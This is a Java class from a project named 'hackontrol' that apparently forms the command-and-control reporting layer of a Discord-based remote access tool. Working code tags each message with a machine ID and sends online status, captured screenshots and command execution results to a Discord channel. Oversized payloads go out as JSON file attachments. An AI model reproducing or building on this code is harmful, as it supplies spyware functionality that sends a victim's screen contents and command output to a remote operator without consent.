package com.khopan.hackontrol.network;

import java.nio.charset.StandardCharsets;

import com.fasterxml.jackson.databind.ObjectMapper;
import com.fasterxml.jackson.databind.node.ObjectNode;
import com.khopan.hackontrol.MachineId;

import net.dv8tion.jda.api.entities.channel.concrete.TextChannel;
import net.dv8tion.jda.api.requests.restaction.MessageCreateAction;
import net.dv8tion.jda.api.utils.FileUpload;

public class Request {
	private final TextChannel channel;
	private final MachineId identifier;
	private final ObjectMapper mapper;

	public Request(TextChannel channel, MachineId identifier) {
		this.channel = channel;
		this.identifier = identifier;
		this.mapper = new ObjectMapper();
	}

	public void statusReport(boolean online) {
		ObjectNode node = this.mapper.createObjectNode();
		node.put("online", online);
		this.request(RequestMode.STATUS_REPORT, node);
	}

	public void screenshotTaken(byte[] image) {
		this.request(RequestMode.SCREENSHOT_TAKEN, this.mapper.createObjectNode(), FileUpload.fromData(image, "screenshot.png"));
	}

	public void commandResult(String result) {
		ObjectNode node = this.mapper.createObjectNode();
		node.put("result", result);
		this.request(RequestMode.COMMAND_RESULT, node);
	}

	private void request(int requestMode, ObjectNode node, FileUpload... files) {
		node.put("requestMode", requestMode);
		node.put("machineId", this.identifier.getIdentifier());
		String message = node.toString();

		if(message.length() > 2000) {
			MessageCreateAction action = this.channel.sendFiles(FileUpload.fromData(message.getBytes(StandardCharsets.UTF_8), "response.json"));

			if(files != null && files.length > 0) {
				action.addFiles(files);
			}

			action.queue();
			return;
		}

		MessageCreateAction action = this.channel.sendMessage(message);

		if(files != null && files.length > 0) {
			action.addFiles(files);
		}

		action.queue();
	}
}
